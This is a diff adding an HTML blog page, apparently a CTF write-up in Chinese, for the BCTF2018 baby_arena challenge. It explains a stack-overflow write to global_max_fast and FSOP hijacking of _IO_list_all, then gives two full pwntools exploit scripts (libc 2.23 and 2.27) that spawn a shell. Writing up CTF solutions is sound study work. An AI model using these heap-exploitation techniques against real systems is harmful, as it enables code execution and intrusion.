@@ -1,0 +1,389 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>BCTF2018_baby_arena(House of Corrosion) | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="BCTF2018_baby_arena(House of Corrosion) | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="在github上找的一道libc2.23环境下的global_max_fast + fsop的题。
+在buu上这道题变成了libc2.27，在fsop部分稍有不同，这里为了强调思路，我就主要讨论原题，也就是libc2.23的环境了。
+buu..." />
+    <meta name="keywords" content="刷题" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              BCTF2018_baby_arena(House of Corrosion)
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-06
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/rQaLED_Cv/" class="post-tag">
+                  # 刷题
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>在github上找的一道libc2.23环境下的global_max_fast + fsop的题。</p>
+<p>在buu上这道题变成了libc2.27，在fsop部分稍有不同，这里为了强调思路，我就主要讨论原题，也就是libc2.23的环境了。</p>
+<p>buu上的exp也会给出来</p>
+<h1 id="分析">分析</h1>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/06/1d310a0df1412.png" alt="1649228041984.png" loading="lazy"></figure>
+<p>提供了3个功能，create，delete和login。在create的时候会puts堆块的内容，这里是可以leak出libc和heap基址的。但是没有溢出，delete也没有问题。</p>
+<p>问题就出在login这个功能里面，</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/06/ed45b0150caf2.png" alt="1649228193284.png" loading="lazy"></figure>
+<p>一开始问了你的name，以__int64类型的方式存到了qword_6020B0，然后又问了type，将对应type的字符串存到了v4所指向的qword_6020B0+0x8处。</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/06/58dab5b37e37b.png" alt="1649228397295.png" loading="lazy"></figure>
+<p>但是name这个位置实际上是存在栈溢出的，可以覆盖v4的值，导致我们可以实现一次将0x6E696D6461或者0x6C65746E65696C63写到任意地址（v4+0x8）。</p>
+<p>在glibc里，fastbin会接受的最大size是一个叫global_max_fast的全局变量控制的，默认情况为0x80，小于等于该大小的chunk在free掉之后会被放进fastbin。</p>
+<pre><code class="language-c">typedef struct malloc_chunk *mfastbinptr;
+
+/*
+    This is in malloc_state.
+    /* Fastbins */
+    mfastbinptr fastbinsY[ NFASTBINS ];
+*/
+</code></pre>
+<p>fastbin的索引有如下计算方式：</p>
+<pre><code class="language-c">#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])
+
+/* offset 2 to use otherwise unindexable first 2 bins */
+// chunk size=2*size_sz*(2+idx)
+#define fastbin_index(sz)                                                      \
+    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
+</code></pre>
+<p>所以，如果将global_max_fast改成一个较大的值，那么很有可能会造成fastbinsY这个数组的越界，将某一处于他之后的值改成一个堆上的地址。</p>
+<p>这里很容易想到，可以把_IO_list_all给劫持下来，在堆上直接伪造一个 _IO_FILE_plus和vtable，然后后面create堆块时，一定会触发fastbin的报错，从而打出来malloc_printerr -&gt; _IO_flush_all_lockp -&gt; _IO_overflow这条链子，然后getshell。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/06/12a31a9a49bbd.png" alt="1649229296941.png" loading="lazy"></figure>
+<p>我这里浅算了一波chunksize，让这个chunk被free的时候，能把它的地址写到_IO_list_all里</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/06/3c649acbe40a1.png" alt="1649229466055.png" loading="lazy"></figure>
+<p>后面就是简单的fsop了，没什么好说的。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/06/336982b92d451.png" alt="1649229527987.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/04/06/8eeb4e343484f.png" alt="1649229558514.png" loading="lazy"></figure>
+<p>libc2.23的fsop控制好_IO_FILE里面 _IO_write_ptr &gt; _IO_write_base 以及 _mode &lt;= 0就好了。</p>
+<p>我这里getshell用的是system('/bin/sh\x00')，应该也是可以直接写one_gadget的。</p>
+<h1 id="exp-on-libc-223">exp on libc-2.23</h1>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+elf = ELF('./pwn.test')
+libc = ELF('./libc-2.23.so')
+p = process('./pwn.test')
+
+def choice(idx):
+	p.recvuntil('exit\n')
+	p.sendline(str(idx))
+
+def create(sz, content):
+	choice(1)
+	p.recvuntil('size\n')
+	p.sendline(str(sz))
+	p.recvuntil('note\n')
+	p.sendline(content)
+
+def delete(idx):
+	choice(2)
+	p.recvuntil('id:\n')
+	p.sendline(str(idx))
+
+def login(name, type):
+	choice(3)
+	p.recvuntil('name\n')
+	p.send(name)
+	p.recvuntil('type\n')
+	p.sendline(str(type))
+
+create(0x98, 'AAAAAAAA') # 0
+create(0x98, 'BBBBBBBB') # 1
+delete(0)
+create(0x98, 'AAAAAAAA') # 0
+p.recvuntil('AAAAAAAA')
+libc_info = u64(p.recvline()[:-1].ljust(0x8, b'\x00'))
+libcbase = libc_info - 0x3c4b78
+global_max_fast = libcbase + 0x3c67f8
+sys = libcbase + libc.symbols['system']
+print(hex(libcbase))
+print(hex(global_max_fast))
+
+create(0x400, 'AAAAAAAA') # 2
+create(0x400, 'CCCCCCCC') # 3
+pay = b'a'*0x90 + b'/bin/sh\x00'
+create(0x98, pay) # 4
+delete(2)
+delete(3)
+create(0x400, b'A'*0x10) # 2
+p.recvuntil('AAAAAAAAAAAAAAAA')
+heapbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) &amp; 0xfffffffffffff000
+print(hex(heapbase))
+
+fsop = p64(0)*3 + p64(1)
+fsop = fsop.ljust(0xc8, b'\x00')
+fsop += p64(heapbase+0xae0)
+fsop += p64(0)*3 + p64(sys)
+create(0x1400, fsop) # 3
+
+pay = b'A'*8 + p64(global_max_fast-0x8)
+login(pay, 1)
+delete(3)
+
+choice(1)
+p.recvuntil('size\n')
+p.sendline(str(0x100))
+
+p.interactive()
+
+</code></pre>
+<h1 id="exp-on-libc-227">exp on libc-2.27</h1>
+<p>（我这里leak libcbase和heapbase是利用的tcachebin和unsortedbin，getshell打的是_IO_str_jumps -&gt; _IO_str_finish）</p>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+elf = ELF('./pwn')
+libc = ELF('./libc-2.27.so')
+p = process('./pwn')
+# p = remote('node4.buuoj.cn', 26180)
+
+def choice(idx):
+	p.recvuntil('exit\n')
+	p.sendline(str(idx))
+	# sleep(0.1)
+
+def create(sz, content):
+	choice(1)
+	p.recvuntil('size\n')
+	p.sendline(str(sz))
+	p.recvuntil('note\n')
+	p.sendline(content)
+
+def delete(idx):
+	choice(2)
+	p.recvuntil('id:\n')
+	p.sendline(str(idx))
+
+def login(name, type):
+	choice(3)
+	p.recvuntil('name\n')
+	p.send(name)
+	p.recvuntil('type\n')
+	p.sendline(str(type))
+
+for i in range(9):
+	create(0x98, 'AAAAAAAA')
+for i in range(8):
+	delete(i)
+
+create(0x98, '') # 0
+p.recvuntil('is\n')
+heapbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) &amp; 0xfffffffffffff000
+create(0x98, '/bin/sh\x00')
+for i in range(6):
+	create(0x98, 'AAAAAAAA')
+p.recvuntil('AAAAAAAA')
+libcbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) - 0x3ebca0
+global_max_fast = libcbase + 0x3ed940
+sys = libcbase + libc.symbols['system']
+print(hex(heapbase))
+print(hex(libcbase))
+print(hex(global_max_fast))
+print(hex(sys))
+
+def get_IO_str_jumps():
+	io_file_jumps_offset = libc.symbols['_IO_file_jumps']
+	io_str_underflow_offset = libc.symbols['_IO_str_underflow']
+	for temp in libc.search(p64(io_str_underflow_offset)):
+		io_str_jumps = temp-0x20
+		if io_str_jumps &gt; io_file_jumps_offset:
+			return (libcbase+io_str_jumps)
+
+io_str_jumps = get_IO_str_jumps()
+str_binsh = heapbase + 0x580
+print(hex(io_str_jumps))
+print(hex(str_binsh))
+
+'''
+fsop = p64(0)*3
+fsop += p64((str_binsh-100)//2+1)
+fsop += p64(0)*2
+fsop += p64((str_binsh-100)//2)
+fsop = fsop.ljust(0x98, b'\x00')
+fsop += p64(2) + p64(3) + p64(0)
+fsop += p64(0xffffffff)
+'''
+
+fsop = p64(0)*3 + p64(1)
+fsop += p64(0) + p64(str_binsh)
+fsop = fsop.ljust(0xc8, b'\x00')
+fsop += p64(io_str_jumps-0x8)
+fsop += p64(0) + p64(sys)
+create(0x1430, fsop) # 9
+
+pay = b'a'*0x8 + p64(global_max_fast-0x8)
+login(pay, 1)
+delete(9)
+
+choice(4)
+
+p.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp-on-libc-223">exp on libc-2.23</a></li>
+<li><a href="#exp-on-libc-227">exp on libc-2.27</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/HCTF2018the_end(exit hook)/">
+              <h3 class="post-title">
+                HCTF2018 THE_END(exit hook)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
